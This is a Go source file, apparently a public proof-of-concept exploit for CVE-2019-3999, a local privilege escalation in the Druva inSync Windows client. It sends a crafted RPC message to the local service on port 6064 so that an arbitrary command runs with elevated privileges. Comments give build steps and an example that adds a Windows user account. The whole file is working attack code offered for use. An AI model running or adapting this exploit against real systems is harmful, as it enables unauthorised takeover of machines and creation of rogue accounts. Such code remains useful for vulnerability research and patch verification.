// CVE-2019-3999 Druva inSync Client inSyncCPHwnet64.exe LPE 
// GOOS=windows GOARCH=386 go build -o CVE-2019-3999.exe CVE-2019-3999.go
// CVE-2019-3999.exe -command "net user mc blahblah /add"
// running CVE-2019-3999.exe simply executes calc.exe
package main

import (
  "flag"
  "bytes"
  "net"
  "os"
  "strings"
)

func main() {

var cmd = flag.String("command","calc.exe","The command to execute.")

flag.Parse()

conn, err := net.Dial("tcp", "127.0.0.1:6064")

if err != nil {
 println("[!] Socket Failed:", err.Error())
 os.Exit(1)
}

doit := *cmd
doit_size := len(doit) * 2
size := string(doit_size) + strings.Repeat("\x00", 3)

conn.Write([]byte("inSync PHC RPCW[v0002]"))
conn.Write([]byte("\x05\x00\x00\x00"))
conn.Write([]byte(size))
conn.Write([]byte(insertNth(doit,1)))
}

// borrowed. 
// https://play.golang.org/p/HEGbe7radf
func insertNth(s string, n int) string {
 var buffer bytes.Buffer
 var n_1 = n - 1
 var l_1 = len(s) - 1
 for i, rune := range s {
  buffer.WriteRune(rune)
   if i%n == n_1 && i != l_1 {
    buffer.WriteRune('\x00')
   }
 }
return buffer.String()
}
